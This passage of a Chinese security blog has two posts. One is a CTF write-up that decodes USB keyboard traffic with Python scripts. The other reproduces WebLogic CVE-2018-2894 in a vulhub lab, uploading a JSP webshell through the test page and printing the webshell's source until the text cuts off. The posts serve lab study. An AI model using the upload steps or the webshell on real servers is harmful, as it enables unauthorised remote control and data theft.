class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">file</span>):</span><br><span class="line">    keys=<span class="built_in">open</span>(file)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">                 <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">                output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    keys.close()</span><br><span class="line">    </span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> output[a]</span><br><span class="line">            <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                output.pop(i)</span><br><span class="line">                <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">                output[i]=output[i].upper()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">out(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line">out(<span class="string">&quot;2.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1721631569202-6.png" alt="img"></p><p>output1:16进制转化为rar压缩包</p><p>output2:rar压缩包密码</p><p>flag{20de17cc-d2c1-4b61-bebd-41159ed7172d}</p><h3 id="MoeCTF-2022-usb"><a href="#MoeCTF-2022-usb" class="headerlink" title="[MoeCTF 2022]usb"></a>[MoeCTF 2022]usb</h3><p>找个类似题目练习一下</p><p><img src="/img/1721631569202-7.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r <span class="number">3.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.2.1&quot;&#x27;</span> &gt; <span class="number">3.</span>txt</span><br></pre></td></tr></table></figure><p><strong>加****：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;3.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out3.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>键盘流量转化</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">file</span>):</span><br><span class="line">    keys=<span class="built_in">open</span>(file)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">                 <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">                output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    keys.close()</span><br><span class="line">    </span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> output[a]</span><br><span class="line">            <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                output.pop(i)</span><br><span class="line">                <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">                output[i]=output[i].upper()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">out(<span class="string">&quot;3.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1721631569202-8.png" alt="img"></p><p>moectf{Learned_a6ou7_USB_tr@ffic}</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>weblogic漏洞复现</title>
      <link href="/2024/07/21/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/21/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>简介：</p><p>WebLogic是美国<a href="http://lib.csdn.net/base/oracle">Oracle</a>公司出品的一个application server，确切的说是一个基于JAVAEE<a href="http://lib.csdn.net/base/architecture">架构</a>的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和<a href="http://lib.csdn.net/base/mysql">数据库</a>应用的<a href="http://lib.csdn.net/base/java">Java</a>应用服务器。将Java的动态功能和<a href="http://lib.csdn.net/base/java">Java </a>Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中</p><p><img src="/img/1721567330384-14.png" alt="img"></p><p>初始页面</p><p><img src="/img/1721567330382-4.png" alt="img"></p><p>这里推荐一个批量扫描脚本工具</p><p><a href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p><h3 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h3><p>环境搭建：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub-master/weblogic/CVE-<span class="number">2018</span>-<span class="number">2894</span></span><br><span class="line">docker-compose up -d    <span class="comment">#docker上部署,关闭docker后再次访问直接输入即可</span></span><br><span class="line">docker ps   <span class="comment">#查看正在运行进程，发现其映射到7001端口</span></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.228</span><span class="number">.131</span>:<span class="number">7001</span>/console/   <span class="comment">#访问7001，192.168.228.131是自己的主机名</span></span><br><span class="line">docker-compose down   <span class="comment">#复现之后记得销毁靶场，开启另一个靶场前要销毁前一个靶场</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721567330383-5.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker-compose logs | grep password  <span class="comment">#查看其密码为y9a03WHP</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721567330383-6.png" alt="img"></p><p>点击base_domain，点击advance处Enable Web Service Test Page，save保存</p><p><img src="/img/1721567330383-7.png" alt="img"></p><p><img src="/img/1721567330383-8.png" alt="img"></p><p>访问<a href="http://your-ip:7001/ws_utc/config.do%EF%BC%8C%E8%AE%BE%E7%BD%AEWork">http://your-ip:7001/ws_utc/config.do，设置Work</a> Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p><p><img src="/img/1721567330383-9.png" alt="img"></p><p>点击安全 -&gt; 增加，然后上传1.jsp,进行bp抓包，我们可以发现时间戳<strong>1721315515880</strong></p><p><img src="/img/1721567330383-10.png" alt="img"></p><p>上传1.jsp获取其shell</p><p><img src="/img/1721567330384-11.png" alt="img"></p><p>蚁剑连接</p><p><img src="/img/1721567330384-12.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%@page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;&lt;%!</span><br><span class="line">    String Pwd = <span class="string">&quot;Cknife&quot;</span>;</span><br><span class="line">    String cs = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    String EC(String s) throws Exception &#123;<span class="keyword">return</span> new String(s.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),cs);&#125;</span><br><span class="line">    </span><br><span class="line">    Connection GC(String s) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;choraheiheihei&quot;</span>);</span><br><span class="line">        Class.forName(x[<span class="number">0</span>].trim());<span class="keyword">if</span>(x[<span class="number">1</span>].indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>)&#123;<span class="keyword">return</span> DriverManager.getConnection(x[<span class="number">1</span>].trim()+<span class="string">&quot;:&quot;</span>+x[<span class="number">4</span>],x[<span class="number">2</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">2</span>],x[<span class="number">3</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">3</span>]);&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Connection c = DriverManager.getConnection(x[<span class="number">1</span>].trim(),x[<span class="number">2</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">2</span>],x[<span class="number">3</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">3</span>]);<span class="keyword">if</span> (x.length &gt; <span class="number">4</span>) &#123;</span><br><span class="line">                c.setCatalog(x[<span class="number">4</span>]);&#125;<span class="keyword">return</span> c;&#125;&#125;void AA(StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File k = new File(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        File r[] = k.listRoots();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(<span class="number">0</span>, <span class="number">2</span>));&#125;&#125;void BB(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File oF = new File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = new java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.<span class="built_in">format</span>(dt);</span><br><span class="line">            sQ = l[i].canRead() ? <span class="string">&quot;R&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            sQ += l[i].canWrite() ? <span class="string">&quot; W&quot;</span> : <span class="string">&quot;&quot;</span>;<span class="keyword">if</span> (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() 